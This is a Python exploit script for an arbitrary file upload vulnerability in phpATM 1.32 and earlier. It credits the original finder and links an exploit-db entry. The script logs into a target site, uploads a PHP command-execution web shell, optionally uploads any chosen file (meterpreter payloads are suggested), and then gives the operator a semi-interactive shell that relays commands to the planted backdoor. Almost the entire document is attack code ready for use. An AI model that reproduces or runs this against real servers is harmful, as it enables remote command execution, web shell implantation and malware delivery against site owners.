#!/usr/bin/env python
'''
    Title          | "PHP Advanced Transfer Manager phpATM <= 1.32 Arbitrary File Upload"
    Date           |  10/15/2016
    Author         |  Christopher Davis 
    Vendor         |  phpATM - http://phpatm.org/
    Version        |  <= 1.32
    Tested on      |  Windows 7 with UwAmpp
    Purpose        |  Provides a python version of the exploit code along with additional features
    Usage          |  python exploit.py -u http://192.168.1.139 -n admin -p test -f meterpreter.exe
    What it do?    |  uploads a php cmd web shell OR upload any file you want

    Special Credit goes to Paolo Massenio (for finding the vulnerability)
    See his work at: https://www.exploit-db.com/exploits/39971/
'''
import re
import subprocess
import argparse
import random

#This portion will check for requests and prompt user to install it if not already
try:
    import requests
except:
    try:
        while True:
            choice = raw_input('Requests library not found but is needed. Install? \'Y\'es or \'N\'o?\n:')
            if choice.lower() == 'y':
                p = subprocess.Popen('pip install requests',stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                out, err == p.communicate()
                if len(err) != 0:
                    raise NameError(str(err) + '\n\n' + 'Could not install requests')
                import requests
                break
            elif choice.lower() == 'n':
                exit()
            else:
                continue
    except Exception as e:
        print(e)
        exit()

parser = argparse.ArgumentParser()
parser.add_argument('-u', type=str, help='hostname and path. Ex- http://192.168.1.1/path/', dest='url')
parser.add_argument('-n', type=str, help='username', dest='user')
parser.add_argument('-p', type=str, help='password', dest='passw')
parser.add_argument('-f', type=str, help='optional switch: filename/path. User may upload binary file and then execute shell(good for meterpreter uploads)', dest='file')
parser.add_help
args = parser.parse_args()

#Make sure args were passed
if args.url == None or args.user == None or args.passw == None:
    parser.print_help()
    exit()

#Make sure the http url is there
if bool(re.search('[hH][tT][tT][pP][sS]?\:\/\/', args.url)) == False:
    print('There is something wrong with your url. It needs to have http:// or https://\n\n')
    exit()

#make sure / is there, if not, put it there
if args.url[-1:] != '/':
    args.url += '/'

#This is our command shell we will upload
cmdshell = '''<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    die;
}
?>'''
           
#Create a session, then attempt to login 
session = requests.Session()
postData = {'action':'userlogin','user_name':args.user,'user_pass':args.passw}
result = session.post(args.url+'login.php', data=postData, verify=False).text
print('Attempting to login\n\n')
if 'Logout' not in result:
    print('Those credentials you supplied were incorrect\n\n')
    exit()
else:
    print('Successfully logged in\n\n')


evilphpname = '0'+'x'+''.join(random.choice('0123456789') for i in range(10)) + '_hax0r.php '
postData = {'action':'upload','directory':'','order':'nom','direction':'0','description':''}
evil = {'userfile': (evilphpname, cmdshell,'application/octet-stream',)}
result1 = session.post(args.url+'index.php', data=postData, files=evil, verify=False)
if 'has successfully been uploaded' in result1.text:
    #Cool so webshell uploaded successfully. Lets see if user wants to upload something else
    if args.file:
        if '.' not in args.file:
            print('Not uploading the file you specified because it does not have an extension.\n\n')
            pass
        else:
            print('Moving on to upload the file you specified\n\n')
            extension = args.file[(args.file).rfind('.'):]
            filename = '0'+'x'+''.join(random.choice('0123456789') for i in range(10)) + '_hax0r'+extension+' '
            thefile = open(args.file,'rb')
            thefile = thefile.read()
            postData = {'action':'upload','directory':'','order':'nom','direction':'0','description':''}
            evil = {'userfile': (filename, thefile,'application/octet-stream',)}
            result = session.post(args.url+'index.php', data=postData, files=evil, verify=False)
            if 'has successfully been uploaded' in result.text:
                print('File: '+filename+'has been uploaded to '+args.url + ' located in the /files/ dir\n\n')
            else:
                print('Didnt upload properly for some reason. Moving on...\n\n')
    print('The command execution file: '+evilphpname+'has been uploaded to '+args.url + 'the /files/ dir\nA get query of ?cmd= can be used on that file to execute commands\n\nEnter semi-interactive shell now?')
    
    #Lets see if the user wants to script to passed commands to the webshell for ease of use.
    while True:
        choice = raw_input('\'Y\'es or \'N\'o?\n:')
        if choice.lower() == 'y':
            while True:
                command = raw_input('\n:')
                result = requests.post(args.url + 'files/'+evilphpname+'?cmd=' + command, verify=False).text
                print('\n'+result)
        elif choice.lower() == 'n':
            exit()
        else:
            continue
else:
    print('File Failed to upload')



